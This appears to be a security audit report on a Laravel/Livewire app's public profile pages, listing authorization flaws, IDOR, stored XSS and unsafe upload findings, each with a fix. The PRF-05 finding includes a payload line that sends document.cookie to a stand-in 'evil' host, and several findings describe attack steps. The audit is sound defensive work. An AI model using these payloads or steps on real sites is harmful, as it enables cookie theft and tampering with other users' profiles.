# Security — Public Profile Sections

Scope: `routes/web.php` → `profile/{slug}` (public route, no `auth`), the parent component [userprofile.blade.php](../resources/views/livewire/userprofile.blade.php) and its 13 child section components in [resources/views/livewire/profile/](../resources/views/livewire/profile/).

All child sections follow the same pattern: the parent passes `:user` and `:is-own-profile`, and each `save*` / `delete*` action trusts `$this->isOwnProfile` plus `$this->user`. That pattern is the root cause of PRF-01 to PRF-04.

---

## PRF-01 — Guests are treated as the owner of every profile — **Critical**

- **Where:** [userprofile.blade.php:36-42](../resources/views/livewire/userprofile.blade.php#L36-L42)
- **Code:**
  ```php
  if (auth()->check() && $this->user) {
      $this->isOwnProfile = (string) auth()->id() === (string) $this->user->_id;
  } else {
      // Default to true for UI design verification preview
      $this->isOwnProfile = true;
  }
  ```
- **Problem:** Any visitor who is **not logged in** gets `isOwnProfile = true` for every real profile. This value is passed to every section component, and those components use it as their only owner check.
- **Attack:** A logged-out visitor opens `/profile/{victim-slug}` and calls `saveAbout`, `saveExperience`, `saveEducation`, `saveAward`, `saveProject`, `saveSeminar`, `saveThesis`, `saveMembership`, `savePatent`, `savePosition`, `saveJournalRole` or any `delete*` method (from the browser console, `Livewire.find(id).call(...)`, or simply the edit buttons that are rendered). All writes are applied to the victim's profile.
- **Fix:** Set `isOwnProfile = false` for guests. Never use it as a security check (see PRF-02).

## PRF-02 — `isOwnProfile` is a client-writable Livewire property — **Critical**

- **Where:** every section component, e.g. [experience.blade.php:28](../resources/views/livewire/profile/experience.blade.php#L28), [about.blade.php:23](../resources/views/livewire/profile/about.blade.php#L23), [awards.blade.php:23](../resources/views/livewire/profile/awards.blade.php#L23), [seminars.blade.php:29](../resources/views/livewire/profile/seminars.blade.php#L29) (same in all 13 files).
- **Problem:** `public bool $isOwnProfile` has no `#[Locked]` attribute (the whole app has only one `#[Locked]` property, in `auth/reset-password`). Livewire lets the client update any unlocked public property in the same request as a method call.
- **Attack:** A logged-in user visiting someone else's profile sends an update with `isOwnProfile: true` together with `saveExperience(...)`; the check `if (! $this->isOwnProfile || ! $this->user)` passes and the victim's profile is changed. This works even after PRF-01 is fixed.
- **Fix:** Do not trust a property. In every write method compute ownership on the server: `abort_unless(auth()->check() && (string) auth()->id() === (string) $this->user->_id, 403);` (publications already does this — see [publications.blade.php:124](../resources/views/livewire/profile/publications.blade.php#L124)). Also add `#[Locked]` to `isOwnProfile` and `user`.

| Section file | Owner check used in save/delete | Also checks `Auth::id()`? |
| --- | --- | --- |
| about | `isOwnProfile` + `user` | No |
| awards | `isOwnProfile` + `user` | No |
| certificates | **none** (see PRF-03) | No |
| education | `isOwnProfile` + `user` | No |
| experience | `isOwnProfile` + `user` | No |
| invited-positions | `isOwnProfile` + `user` | No |
| journal-roles | `isOwnProfile` + `user` | No |
| memberships | `isOwnProfile` + `user` | No |
| patents | `isOwnProfile` + `user` | No |
| projects | `isOwnProfile` + `user` | No |
| publications | `isOwnProfile` + `Auth::id() === user._id` | **Yes** |
| seminars | `isOwnProfile` only | No |
| thesis | `isOwnProfile` + `user` | No |

## PRF-03 — Certificates: no authorization at all on save/delete — **Critical**

- **Where:** [certificates.blade.php:171](../resources/views/livewire/profile/certificates.blade.php#L171) `saveCertificate`, [certificates.blade.php:307](../resources/views/livewire/profile/certificates.blade.php#L307) `deleteCertificate`
- **Problem:** Neither method checks `isOwnProfile`, `Auth::check()` or record ownership. `Certificate::findOrFail($id)` accepts any certificate ID.
- **Attack:** Any visitor (including guests) on any profile page can edit or delete **any certificate in the database** by ID, and delete the attached file from `public/certificate/`.
- **Fix:** Add the server-side owner check from PRF-02 and verify `$cert->user_id === auth()->id()` before update/delete.

## PRF-04 — IDOR: save/delete accept record IDs that belong to other users — **High**

- **Problem:** Even for the real owner, the `id` in the payload is looked up with `Model::find($id)` / `findOrFail($id)` with no `user_id` check. A user can edit or delete another user's records by passing their IDs. Edited records are also pushed into the attacker's own `ReviewerProfile` array.
- **Where (no ownership check):**

| Section | Save lookup | Delete lookup |
| --- | --- | --- |
| awards | [awards.blade.php:125](../resources/views/livewire/profile/awards.blade.php#L125) | [awards.blade.php:179](../resources/views/livewire/profile/awards.blade.php#L179) |
| certificates | [certificates.blade.php:200](../resources/views/livewire/profile/certificates.blade.php#L200) | [certificates.blade.php:310](../resources/views/livewire/profile/certificates.blade.php#L310) |
| education | [education.blade.php:237](../resources/views/livewire/profile/education.blade.php#L237) | [education.blade.php:289](../resources/views/livewire/profile/education.blade.php#L289) |
| experience | [experience.blade.php:237](../resources/views/livewire/profile/experience.blade.php#L237) | [experience.blade.php:289](../resources/views/livewire/profile/experience.blade.php#L289) |
| invited-positions | [invited-positions.blade.php:152](../resources/views/livewire/profile/invited-positions.blade.php#L152) | [invited-positions.blade.php:211](../resources/views/livewire/profile/invited-positions.blade.php#L211) |
| memberships | [memberships.blade.php:152](../resources/views/livewire/profile/memberships.blade.php#L152) | [memberships.blade.php:211](../resources/views/livewire/profile/memberships.blade.php#L211) |
| patents | [patents.blade.php:136](../resources/views/livewire/profile/patents.blade.php#L136) | ✅ checked at line 199 |
| projects | [projects.blade.php:427](../resources/views/livewire/profile/projects.blade.php#L427) | [projects.blade.php:471](../resources/views/livewire/profile/projects.blade.php#L471) |
| seminars | [seminars.blade.php:387](../resources/views/livewire/profile/seminars.blade.php#L387) | ✅ checked at line 446 |
| thesis | [thesis.blade.php:131](../resources/views/livewire/profile/thesis.blade.php#L131) | [thesis.blade.php:187](../resources/views/livewire/profile/thesis.blade.php#L187) |
| journal-roles | ✅ checked in `HandlesJournalRoleSection` line 376 | ✅ checked at line 519 |
| publications | see [publications_and_articles.md](publications_and_articles.md) PUB-01 | |

- **Fix:** Scope every lookup to the owner: `Award::where('user_id', (string) $this->user->_id)->findOrFail($id)`.

## PRF-05 — Stored XSS through `javascript:` links in the profile hero — **High**

- **Where:** saved raw in [about.blade.php:63-91](../resources/views/livewire/profile/about.blade.php#L63-L91) (`github_url`, `google_scholar_url`, `orcid_url`, `linkedin_url`, `youtube_link`, `employee_url`, `public_profile`); rendered in [hero.blade.php:116-210](../resources/views/components/profile/hero.blade.php#L116-L210) as `href="{{ $githubUrl }}"` etc.
- **Problem:** Values are only `trim()`-ed. Blade `{{ }}` escapes HTML but does **not** block the `javascript:` scheme inside `href`.
- **Attack:** Set `linkedin_url` to `javascript:fetch('//evil/?c='+document.cookie)`. Anyone who clicks the LinkedIn icon on that public profile runs the script in the app origin. Combined with PRF-01/02 an attacker can plant this on **someone else's** profile.
- **Fix:** Validate with `['nullable', 'url:http,https']` on save, and only render links that start with `http://` or `https://`.

## PRF-06 — Same `javascript:` issue on project links — **Medium**

- **Where:** stored at [projects.blade.php:341](../resources/views/livewire/profile/projects.blade.php#L341) / [445](../resources/views/livewire/profile/projects.blade.php#L445), rendered at [projects.blade.php:943](../resources/views/livewire/profile/projects.blade.php#L943) and in the admin partial `admin/users/partials/projects.blade.php:1013`.
- **Problem:** `project_url` is only trimmed. (Memberships, invited-positions and journal-roles prepend `https://` when the scheme is missing, so they are safe.)
- **Fix:** `url:http,https` validation on save.

## PRF-07 — Certificate upload keeps the client's file extension in `public/` — **High**

- **Where:** [certificates.blade.php:230-236](../resources/views/livewire/profile/certificates.blade.php#L230-L236)
- **Problem:** Validation is `mimes:jpg,jpeg,png,pdf`, which in Laravel checks the **content** (`guessExtension()`), and only blocks PHP extensions. The file is then saved as `md5(...) . '.' . getClientOriginalExtension()` directly under `public/certificate/`.
- **Attack:** Upload a file that starts with valid JPEG/PDF bytes but is named `x.html` or `x.svg` with `<script>` inside. It passes validation and is served as `https://site/certificate/<hash>.html` → stored XSS on the main domain (session riding, CSRF-token theft). Combined with PRF-03 this is possible for guests.
- **Fix:** Use the server-detected extension (`$file->guessExtension()` / `extension()`) or a fixed one, store on a non-public disk, and serve through a controller with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.

## PRF-08 — Guest-callable helper methods with no auth — **Low**

- **Where:** `seminars::autoDetectCountry(?string $clientTimezone)` [seminars.blade.php:82](../resources/views/livewire/profile/seminars.blade.php#L82), `projects::searchContributors` [projects.blade.php:163](../resources/views/livewire/profile/projects.blade.php#L163), `publications::searchAuthors` (see API-03 in [public_api_endpoints.md](public_api_endpoints.md)).
- **Problem:** These run for anonymous visitors without rate limiting. `searchContributors` matches against the `email` field, so the result list works as an "is this email registered?" oracle. `autoDetectCountry` takes any string and uses it in a 30-day cache key (see CFG-08).
- **Fix:** Require auth + owner for edit-only helpers; add `RateLimiter` throttling.

---

### Cross-check log

| ID | How it was verified |
| --- | --- |
| PRF-01 | Read `mount()` of `userprofile`; confirmed route `profile/{slug}` has no `auth` middleware in `routes/web.php`. |
| PRF-02 | `grep '#[Locked]'` over `app/` and `resources/views/` → 1 hit (reset-password). Read guard of every save/delete method. |
| PRF-03 | Read full `saveCertificate` / `deleteCertificate` bodies — no guard. |
| PRF-04 | Read every `find`/`findOrFail` in save/delete; only patents & seminars delete and journal-roles compare `user_id`. |
| PRF-05/06 | Traced input → model → `href` in `hero.blade.php` / `projects.blade.php`; no scheme check. |
| PRF-07 | Read `Illuminate\Validation\Concerns\ValidatesAttributes::validateMimes` (content-based + PHP block only). |
